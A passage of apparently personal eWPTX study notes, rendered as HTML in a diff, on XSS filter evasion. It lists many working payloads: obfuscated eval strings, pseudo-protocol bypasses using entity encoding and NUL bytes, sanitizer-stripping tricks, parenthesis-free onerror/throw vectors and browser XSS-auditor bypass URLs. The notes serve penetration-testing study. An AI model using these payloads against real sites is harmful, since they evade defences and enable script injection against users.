+<span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="s2">eval('</span><span class="se">\</span><span class="s2">a</span><span class="se">\</span><span class="s2">l</span><span class="se">\</span><span class="s2">ert(1</span><span class="se">\</span><span class="s2">)')</span><span class="dl">"</span><span class="o">/&gt;</span>    <span class="err">#</span> <span class="nx">superfluous</span> <span class="nx">escapes</span> <span class="nx">chars</span>
+
+<span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="s2">eval('</span><span class="se">\</span><span class="s2">u0065val('</span><span class="se">\</span><span class="s2">141</span><span class="se">\</span><span class="s2">u006c&amp;#101;&amp;#x0072t</span><span class="se">\</span><span class="s2">(&amp;#49)')</span><span class="dl">"</span><span class="o">/&gt;</span>  <span class="dl">'</span><span class="s1">
+# All chars escaping can stay together.
+</span></code></pre></div></div>
+
+<h3 id="contructing-string">Contructing String</h3>
+<p>Javascript jas several functions useful to create string:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/</span><span class="nx">ale</span><span class="o">/</span><span class="p">.</span><span class="nx">source</span><span class="o">+</span><span class="sr">/rt/</span><span class="p">.</span><span class="nx">source</span>
+<span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">116</span><span class="p">)</span>
+<span class="nf">atob</span><span class="p">(</span><span class="dl">"</span><span class="s2">YWxlcnQ=</span><span class="dl">"</span><span class="p">)</span>
+<span class="mi">177985081</span><span class="p">..</span><span class="nf">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="execution-sinks">Execution Sinks</h3>
+<ul>
+  <li>Technically, functions that parse string as JavaScript code are called execution sinks, and JavaScript offers several alternatives.</li>
+</ul>
+
+<p>Some Sinks:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">setTimeout</span><span class="p">(</span><span class="dl">"</span><span class="s2">JSCode</span><span class="dl">"</span><span class="p">)</span> <span class="c1">//all browsers</span>
+<span class="nf">setInterval</span><span class="p">(</span><span class="dl">"</span><span class="s2">JSCode</span><span class="dl">"</span><span class="p">)</span> <span class="c1">//all browsers</span>
+<span class="nf">setImmediate</span><span class="p">(</span><span class="dl">"</span><span class="s2">JSCode</span><span class="dl">"</span><span class="p">)</span> <span class="c1">//IE 10+</span>
+<span class="nc">Function</span><span class="p">(</span><span class="dl">"</span><span class="s2">JSCode</span><span class="dl">"</span><span class="p">)</span> <span class="c1">//all browsers</span>
+
+<span class="err">#</span> <span class="nx">moreover</span><span class="p">:</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//code.google.com/p/domxsswiki/wiki/ExecutionSinks</span>
+</code></pre></div></div>
+
+<p>Variation of the Function sink:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[].</span><span class="kd">constructor</span><span class="p">.</span><span class="nf">constructor</span><span class="p">(</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+</code></pre></div></div>
+
+<table>
+  <tbody>
+    <tr>
+      <td>object</td>
+      <td>array</td>
+      <td>function</td>
+      <td>XSS vector</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="pseudo-protocols">Pseudo-protocols</h3>
+<p><strong>javascript:</strong> is an unofficional URI scheme, commonly referred as a pseudo-protocol.</p>
+
+<ul>
+  <li>javascript followerd by (:) is usually blocked</li>
+</ul>
+
+<p>Example:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert(1)</span><span class="dl">"</span><span class="o">/&gt;</span>    <span class="dl">"</span><span class="s2"> //blocked
+# javascript: is not needed on event handlers; SO, we should avoid using it.
+</span></code></pre></div></div>
+
+<p>Bypass examples:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">object</span> <span class="nx">data</span><span class="o">=</span><span class="dl">"</span><span class="s2">JaVScRiPt:alert(1)</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">object</span> <span class="nx">data</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript&amp;colon;:alert(1)</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">object</span> <span class="nx">data</span><span class="o">=</span><span class="dl">"</span><span class="s2">java
+script:alert(1)</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">object</span> <span class="nx">data</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript&amp;#x003A;alert(1)</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">object</span> <span class="nx">data</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript&amp;#58;alert(1)</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">object</span> <span class="nx">data</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;#x6A;avascript:alert(1)</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">object</span> <span class="nx">data</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;alert(1)</span><span class="dl">"</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>In addition to <strong>javascript:</strong>, there are also <strong>data:</strong> and the IE exclusive <strong>vbscript:</strong></li>
+</ul>
+
+<p>Data URI scheme:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">data</span><span class="p">:[</span><span class="o">&lt;</span><span class="nx">mediatype</span><span class="o">&gt;</span><span class="p">][;</span><span class="nx">base64</span><span class="p">],</span><span class="o">&lt;</span><span class="nx">data</span><span class="o">&gt;</span>
+
+<span class="err">#</span> <span class="nx">mediatype</span> <span class="nx">is</span> <span class="nx">usually</span> <span class="dl">'</span><span class="s1">text/html</span><span class="dl">'</span>
+</code></pre></div></div>
+
+<p>If <strong>javascript:</strong> is blocked:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">object</span> <span class="nx">data</span><span class="o">=</span><span class="dl">"</span><span class="s2">data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">object</span> <span class="nx">data</span><span class="o">=</span><span class="dl">"</span><span class="s2">data:text/html,base64,&lt;base64 encoded&gt;</span><span class="dl">"</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>If <strong>data:</strong> is blocked:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">embed</span> <span class="nx">code</span><span class="o">=</span><span class="dl">"</span><span class="s2">DaTa:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">embed</span> <span class="nx">code</span><span class="o">=</span><span class="dl">"</span><span class="s2">data&amp;colon;text/html,&lt;script&gt;alert(1)&lt;/script&gt;</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">embed</span> <span class="nx">code</span><span class="o">=</span><span class="dl">"</span><span class="s2">data&amp;#x003A;text/html,&lt;script&gt;alert(1)&lt;/script&gt;</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">embed</span> <span class="nx">code</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;#x64;&amp;#x61;ta:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</span><span class="dl">"</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>The <strong>vbscript</strong> pseudo-protocol is not so common, because it can only be used with IE.</p>
+
+<ul>
+  <li>From IE11 in Edge, vbscript is no longer supported.</li>
+</ul>
+
+<p>How to use vbscript:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">a</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="s2">vbscript:msgbox 1</span><span class="dl">"</span><span class="o">/&gt;</span> <span class="c1">//works till IE8</span>
+<span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">b</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="s2">vbs:msgbox 2</span><span class="dl">"</span><span class="o">/&gt;</span> <span class="c1">//works till IE8</span>
+<span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">c</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="s2">vbs:alert(3)</span><span class="dl">"</span><span class="o">/&gt;</span>   <span class="dl">"</span><span class="s2">//works till IE Edge
+&lt;img src=d onerror=</span><span class="dl">"</span><span class="nx">vbscript</span><span class="p">:</span><span class="nf">alert</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="dl">"</span><span class="s2">/&gt;  </span><span class="dl">"</span><span class="c1">//works till IE Edge</span>
+</code></pre></div></div>
+
+<p>Bypass vbscript:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="s2">vbscript&amp;#x003A;alert(1)</span><span class="dl">"</span><span class="o">/&gt;</span>    <span class="dl">"</span><span class="s2">
+&lt;img src=x onerror=</span><span class="dl">"</span><span class="nx">vb</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x63</span><span class="p">;</span><span class="nl">cript</span><span class="p">:</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="dl">"</span><span class="s2">/&gt;       </span><span class="dl">"</span>
+
+<span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="s2">v&amp;#00;bs&amp;#x00;cri pt:alert(1)</span><span class="dl">"</span><span class="o">/&gt;</span> <span class="c1">//using NUL bytes</span>
+</code></pre></div></div>
+
+<p>Tool to obfuscate:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">http</span><span class="p">:</span><span class="c1">//dennisbabkin.com/screnc/</span>
+</code></pre></div></div>
+
+<h2 id="bypassing-sanitization">Bypassing Sanitization</h2>
+
+<p>The most common is to HTML-encode such as:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span> <span class="p">(</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;)</span>
+<span class="o">&gt;</span> <span class="p">(</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;)</span>
+</code></pre></div></div>
+
+<h3 id="string-manipulations">String Manipulations</h3>
+<p>Example:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">removing</span> <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span> <span class="nx">tag</span>
+</code></pre></div></div>
+
+<h3 id="removing-html-tags">Removing HTML tags</h3>
+<p>The check is not performed recursively:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">scr</span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">ipt</span><span class="o">&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script&gt; # this could be a bypas</span><span class="err">s
+</span></code></pre></div></div>
+
+<p>If the filter performs recursive checks, we can still bypass. maybe changing the order of injected strings.</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">scr</span><span class="o">&lt;</span><span class="nx">iframe</span><span class="o">&gt;</span><span class="nx">ipt</span><span class="o">&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script&gt; /</span><span class="o">/</span><span class="k">this</span> <span class="nx">could</span> <span class="nx">be</span> <span class="nx">a</span> <span class="nx">bypass</span>
+</code></pre></div></div>
+
+<ul>
+  <li>it all depends on the filter that we are facing</li>
+</ul>
+
+<p>→ moreover: https://els-cdn.content-api.ine.com/eda3ac9d-554a-469a-98c6-639c90f0c7a5/index.html#</p>
+
+<h3 id="escaping-quotes">Escaping Quotes</h3>
+<ul>
+  <li>Filters place the backslash char <em>**</em> before quotes to escape that kind of character</li>
+</ul>
+
+<p>Example:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">randomkey</span><span class="err">\</span><span class="dl">'</span><span class="s1"> alert(1);  # escape the apostrophe
+randomkey</span><span class="se">\\</span><span class="dl">'</span> <span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="err">#</span> <span class="nx">escape</span> <span class="nx">the</span> <span class="nx">backslash</span>
+</code></pre></div></div>
+
+<p>One of useful Javascript methods is:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>It allows us to generate strings starting from a sequence of Unicode values:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="mi">120</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">9416</span><span class="p">)</span>
+
+<span class="err">#</span> <span class="nx">u</span><span class="o">+</span><span class="mi">0078</span> <span class="nx">Latin</span> <span class="nx">Small</span> <span class="nx">Letter</span> <span class="nx">x</span>
+<span class="err">#</span> <span class="nx">u</span><span class="o">+</span><span class="mi">0073</span> <span class="nx">Latin</span> <span class="nx">small</span> <span class="nx">Letter</span> <span class="nx">s</span>
+<span class="err">#</span> <span class="nx">u</span><span class="o">+</span><span class="mi">24</span><span class="nx">C8</span> <span class="nx">Circled</span> <span class="nx">Latin</span> <span class="nx">capital</span> <span class="nf">letter </span><span class="p">(</span><span class="nx">S</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/</span><span class="nx">your</span> <span class="nx">string</span><span class="o">/</span><span class="p">.</span><span class="nx">source</span>  <span class="c1">//space allowed</span>
+<span class="mi">43804</span><span class="p">..</span><span class="nf">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">)</span>   <span class="c1">//spaces not allowed in Base36</span>
+</code></pre></div></div>
+
+<p>Using unescape method:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">unescape</span><span class="p">(</span><span class="sr">/%78%u0073%73/</span><span class="p">.</span><span class="nx">source</span><span class="p">)</span> <span class="c1">//its deprecated</span>
+</code></pre></div></div>
+
+<p>Using decodeURI and decodeURIComponent:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span> <span class="k">in</span> <span class="k">this</span> <span class="k">case</span><span class="p">,</span> <span class="nx">characters</span> <span class="nx">needs</span> <span class="nx">to</span> <span class="nx">be</span> <span class="nx">URL</span><span class="o">-</span><span class="nx">encoded</span> <span class="nx">to</span> <span class="nx">avoid</span> <span class="nx">URI</span> <span class="nx">malformed</span> <span class="nx">errors</span>
+
+<span class="nf">decodeURI</span><span class="p">(</span><span class="sr">/alert</span><span class="se">(</span><span class="sr">%22xss%22</span><span class="se">)</span><span class="sr">/</span><span class="p">.</span><span class="nx">source</span><span class="p">)</span>
+<span class="nf">decodeURIcomponent</span><span class="p">(</span><span class="sr">/alert</span><span class="se">(</span><span class="sr">%22xss%22</span><span class="se">)</span><span class="sr">/</span><span class="p">.</span><span class="nx">source</span><span class="p">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>These methods could be useful if you can inject into a script or event handler. nut you cannot use quotation marks because they are properly escaped.</li>
+  <li>Dont forget that each of them will return a string, so you need an execution <strong>sink</strong> to trigger the code (IE: <strong>eval</strong>)</li>
+</ul>
+
+<h3 id="escaping-parentheses">Escaping Parentheses</h3>
+<ul>
+  <li>The technique abuses the onerror handler, assigning a function to call once an error has been generated using throw followed by the arguments to the function assigned to the error handler.</li>
+</ul>
+
+<p>→ moreover: http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="s2">window.onerror=eval;throw'=alert</span><span class="se">\</span><span class="s2">x281</span><span class="se">\</span><span class="s2">x29'</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="err">#</span> <span class="nb">eval</span> <span class="o">-</span> <span class="kd">function</span> <span class="nf">to</span> <span class="nx">invoke</span> <span class="k">in</span> <span class="k">case</span> <span class="k">of</span> <span class="nx">error</span>
+<span class="err">#</span> <span class="k">throw</span> <span class="o">-</span> <span class="nx">generate</span> <span class="nx">the</span> <span class="nx">error</span>
+<span class="err">#</span> <span class="nx">alert</span><span class="p">...</span> <span class="o">-</span> <span class="nx">parameters</span> <span class="nx">For</span> <span class="nx">the</span> <span class="nx">error</span> <span class="kd">function</span>
+
+<span class="nf">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">;</span><span class="k">throw</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// a simple version</span>
+<span class="err">#</span> <span class="nx">does</span> <span class="nx">not</span> <span class="nx">work</span> <span class="k">in</span> <span class="nx">Firefox</span> <span class="nx">and</span> <span class="nx">IE</span>
+</code></pre></div></div>
+
+<p>And since the arguments section is quoted, its possible to do some encoding like the following:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="s2">window.onerror=eval;throw'</span><span class="se">\</span><span class="s2">u003d&amp;#x006C;ert&amp;#x0028;18#41;'</span><span class="dl">"</span><span class="o">/&gt;</span>
+</code></pre></div></div>
+
+<h2 id="bypassing-browser-filters">Bypassing Browser Filters</h2>
+<p>They dont cover all possible XSS attacl scenarios and they focus on Reflected type of XSS.</p>
+
+<h3 id="unfiltered-scenarios---injecting-inside-html-tag">UnFiltered Scenarios - Injecting Inside HTML Tag</h3>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">svg</span><span class="o">/</span><span class="nx">onload</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span> <span class="err">#</span> <span class="nx">its</span> <span class="nx">detected</span> <span class="nx">by</span> <span class="nx">all</span> <span class="nx">main</span> <span class="nx">filters</span>
+</code></pre></div></div>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span> <span class="nx">Just</span> <span class="nx">by</span> <span class="nx">removing</span> <span class="nx">the</span> <span class="nf">final </span><span class="p">(</span><span class="o">&gt;</span><span class="p">)</span> <span class="nx">we</span> <span class="nx">jave</span> <span class="nx">a</span> <span class="nx">bypass</span> <span class="nx">For</span> <span class="nx">browsers</span> <span class="kd">with</span> <span class="nx">XSSAuditor</span>
+<span class="o">&lt;</span><span class="nx">svg</span><span class="o">/</span><span class="nx">onload</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">// works chromium based browser</span>
+</code></pre></div></div>
+
+<p>Injecting inside HTML Tag Attributes:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">site</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">inject</span><span class="p">?</span><span class="nx">x</span><span class="o">=</span><span class="nx">giuseppe</span><span class="dl">"</span><span class="s2">&gt;&lt;svg/onload=alert(1)&gt;
+</span></code></pre></div></div>
+
+<p>We can bypass WebKit with:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">site</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">inject</span><span class="p">?</span><span class="nx">x</span><span class="o">=</span><span class="nx">giuseppe</span><span class="dl">"</span><span class="s2">&gt;&lt;a/href=</span><span class="dl">"</span><span class="nx">data</span><span class="p">:</span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span><span class="nx">base64</span><span class="p">,</span><span class="o">&lt;</span><span class="nx">base64</span> <span class="nx">payload</span><span class="o">&gt;</span><span class="dl">"</span><span class="s2">&gt;clickhere&lt;!--
+</span></code></pre></div></div>
+
+<p>Injecting Inside SCRIPT Tag:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">site</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">inject</span><span class="p">?</span><span class="nx">name</span><span class="o">=</span><span class="nx">belucci</span><span class="dl">"</span><span class="s2">;alert(1);//
+</span></code></pre></div></div>
+
+<p>Injecting Inside Event Attributes:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">site</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">inject</span><span class="p">?</span><span class="nx">roomID</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>DOM Based:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">site</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">inject</span><span class="p">?</span><span class="nx">next</span><span class="o">=</span><span class="nx">javascript</span><span class="p">:</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>DOM Based, there are other scenarios that are not covered by browsers filters.</li>
+</ul>
+
+<blockquote>
+  <p>For example, <strong>fragmented</strong> vectors in multiple GET parameters or attacks that are not reflected in the same page, mXSS, etc.</p>
+</blockquote>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#advanced" class="page__taxonomy-item" rel="tag">advanced</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#bypass" class="page__taxonomy-item" rel="tag">bypass</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ewptx" class="page__taxonomy-item" rel="tag">ewptx</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-11-29T00:00:00+06:00">November 29, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=4+-+XSS+Filter+Evasion%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fxssfilter%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fxssfilter%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fxssfilter%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/notes/ewptx/xss/" class="pagination--pager" title="3 - Cross-site scripting (XSS)
+">Previous</a>
+    
+    
+      <a href="/notes/ewptx/csrf/" class="pagination--pager" title="5 - Cross-site request forgery (CSRF)
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
